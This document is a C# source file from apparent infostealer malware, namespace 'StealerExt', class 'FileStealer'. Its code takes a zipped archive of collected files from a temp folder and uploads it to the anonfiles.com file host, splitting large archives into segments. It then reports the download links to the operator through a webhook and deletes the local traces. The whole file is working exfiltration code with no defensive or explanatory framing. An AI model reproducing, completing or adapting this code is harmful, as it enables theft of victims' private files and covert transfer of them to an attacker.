using Ionic.Zip;
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace StealerExt
{
    public class FileStealer
    {   
        public static void GetFiles()
        {
            #region Send Message
            new API(API.wHook)
            {
                _name = API.name,
                _ppUrl = API.pfp
            }.idk("Waiting for file to be found and archived so it can be sent. If file is large then it can take a while!", null);
            #endregion
            #region Wait & Send Files
            string upload = API.Temp + "files.zip";
            string _Files = string.Empty;
            while (!File.Exists(upload)) {}
            long size = new FileInfo(upload).Length;
            if (size < 19000000000)
            {
                try
                {
                    using (var Client = new ExtendedWebClient())
                    {
                        Client.Timeout = Timeout.Infinite;
                        Client.AllowWriteStreamBuffering = false;
                        byte[] Response = Client.UploadFile("https://api.anonfiles.com/upload", upload);
                        Client.Dispose();
                        string ResponseBody = Encoding.ASCII.GetString(Response);
                        if (ResponseBody.Contains("\"error\": {"))
                        {
                            _Files += "Error: " + ResponseBody.Split('"')[7] + "\r\n";
                        }
                        else
                        {
                            _Files += "Files: " + ResponseBody.Split('"')[15] + "\r\n";
                        }
                    }
                }
                catch (WebException ex)
                {
                    _Files += "Ex: " + ex.Message + "\r\n";
                }
                File.Delete(upload);
                try
                {
                    new API(API.wHook)
                    {
                        _name = API.name,
                        _ppUrl = API.pfp
                    }.idk(_Files, null);
                }
                catch (Exception x)
                {
                    new API(API.wHook)
                    {
                        _name = API.name,
                        _ppUrl = API.pfp
                    }.idk(x.Message, null);
                }
            }
            else
            {
                DirectoryInfo di = new DirectoryInfo(API.Temp + "files");
                ZipFile zip = ZipFile.Read(upload);
                zip.ExtractAll(API.Temp + "files", ExtractExistingFileAction.OverwriteSilently);
                using (ZipFile z = new ZipFile())
                {
                    z.AddDirectory(API.Temp + "files");
                    int s = 199000;
                    z.MaxOutputSegmentSize = s * 102400;
                    z.Save(API.Temp + "f.zip");
                }
                foreach (string file in Directory.GetFiles(API.Temp + "files", "f*.zip", SearchOption.TopDirectoryOnly))
                {
                    try
                    {
                        using (var Client = new ExtendedWebClient())
                        {
                            Client.Timeout = Timeout.Infinite;
                            Client.AllowWriteStreamBuffering = false;
                            byte[] Response = Client.UploadFile("https://api.anonfiles.com/upload", file);
                            Client.Dispose();
                            string ResponseBody = Encoding.ASCII.GetString(Response);
                            if (ResponseBody.Contains("\"error\": {"))
                            {
                                _Files += "Error: " + ResponseBody.Split('"')[7];
                            }
                            else
                            {
                                _Files += "Files: " + ResponseBody.Split('"')[15];
                            }
                        }
                    }
                    catch (WebException ex)
                    {
                        _Files += "Ex: " + ex.Message;
                    }
                    File.Delete(file);
                }
                try
                {
                    new API(API.wHook)
                    {
                        _name = API.name,
                        _ppUrl = API.pfp
                    }.idk(_Files, null);
                }
                catch (Exception x)
                {
                    new API(API.wHook)
                    {
                        _name = API.name,
                        _ppUrl = API.pfp
                    }.idk(x.Message, null);
                }
            }
            #endregion
        }
    }
}
